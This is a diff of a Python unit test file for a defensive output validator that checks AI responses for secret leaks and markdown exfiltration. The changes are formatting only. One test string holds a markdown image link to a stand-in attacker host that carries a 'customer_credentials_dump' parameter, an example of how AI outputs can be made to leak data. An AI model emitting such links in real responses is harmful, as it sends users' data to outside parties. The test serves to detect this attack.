@@ -1,7 +1,7 @@
 """Unit tests for OutputValidator: canary secret leak detection, markdown exfiltration, and schema enforcement."""
 
-import pytest
 from pydantic import BaseModel
+
 from shield.core.models import ActionDecision
 from shield.guards.output_validator import OutputValidator
 
@@ -37,9 +37,7 @@ def test_canary_secret_leak_detected_and_blocked():
 
 def test_markdown_image_exfiltration_blocked():
     validator = OutputValidator()
-    response_text = (
-        "Here is the chart: ![chart](https://attacker.com/leak.png?data=customer_credentials_dump)"
-    )
+    response_text = "Here is the chart: ![chart](https://attacker.com/leak.png?data=customer_credentials_dump)"
     result = validator.validate(response_text)
 
     assert result.passed is False
